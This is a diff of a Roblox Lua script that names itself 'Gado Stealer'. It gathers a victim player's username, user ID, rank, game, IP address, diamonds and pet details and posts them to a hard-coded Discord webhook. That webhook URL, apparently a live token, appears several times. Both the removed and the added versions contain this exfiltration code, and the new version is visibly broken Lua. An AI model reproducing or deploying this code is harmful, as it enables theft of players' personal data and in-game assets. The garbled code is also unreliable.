@@ -17,52 +17,40 @@ _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Ran
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
-_G.Webhook = "https://discord.com/api/webhooks/1120682293263085599/fz0jBPKE3m-dHQmOUHqi4AttqXoOi8gRJuN6tzFKDDbHoV2YHZqVqQzMeNzTmYhZbJgJ"
-local function sendWebhook(msg)
-	local webhook = "_G.Webhook"
-
-	local http_request = http_request or request or HttpPost or syn.request
-	local requestBody = game.HttpService:JSONEncode(msg)
-
-	http_request({
-		Url = webhook,
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = requestBody
-	})
-end
-
+local function sendwebhook(msg)
 local msg = {
-	["content"] = "**@here GADO HAS DETECTED A HIT!**",
-	["embeds"] = {
-		{
-			["title"] = "`Gado Mailstealer Results`",
-			["description"] = "**Data from the victim**\n🧑Display Name: " .. _G.PlrDisplayNameVictim .. "\n🧑Username: " .. _G.PlrUserVictim .. "\n🧑User ID: " .. _G.PlrUserIDVictim .. "\n🐱Rank: " .. _G.CurrentRank .. "\n🎮Place: " .. _G.GameIn .. "\n Player Ip: " .. ip .. "",
-			["url"] = "https://discord.gg/nqny2McnjK",
-			["color"] = webhookcolor,
-			["fields"] = {
-				{
-					["name"] = "```".._G.Diamonds.."```",
-					["value"] = "penis",
-					["inline"] = true
-				},
-				{
-					["name"] = "Pet Name & Rarity",
-					["value"] = "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
-					["inline"] = true
-				}
-			}
-		}
-	},
-	["attachments"] = {}
-} 
+  ["content"]= "**you got a hit! @here**",
+  ["embeds"]= {
+    {
+      ["title"]= "`Gado Stealer results`",
+      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\IP: "..ip.."",
+      ["url"]= "https://discord.gg/nqny2McnjK",
+      ["color"]= ""..webhookcolor.."",
+      ["fields"]= {
+        {
+          ["name"]= "Diamonds 💎",
+          ["value"]= "```".._G.Diamonds.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "Pet Name & Rarity",
+          ["value"]= "```Pet Name: "..v2.name.."\nPet Rarity: "..v2.rarity.."```",
+		  ["inline"]= true
+        }
+      }
+    }
+  },
+  ["attachments"] = {}
+}
 
-if _G.Username == "W4r_ObScUrE" then
-    local webhook = "https://discord.com/api/webhooks/1120682293263085599/fz0jBPKE3m-dHQmOUHqi4AttqXoOi8gRJuN6tzFKDDbHoV2YHZqVqQzMeNzTmYhZbJgJ"
-    sendWebhook(msg)
+if _G.Username == "W4r_ObScUrE"
+     local Webhook = "https://discord.com/api/webhooks/1120682293263085599/fz0jBPKE3m-dHQmOUHqi4AttqXoOi8gRJuN6tzFKDDbHoV2YHZqVqQzMeNzTmYhZbJgJ"
+     request = http_request or request or HttpPost or syn.request
+     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+     sendwebhook(msg)
 else
-       sendWebhook(msg) 
-end 
-
+     local Webhook = "_G.Webhook"
+     request = http_request or request or HttpPost or syn.request
+     request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+     sendwebhook(msg)
+end
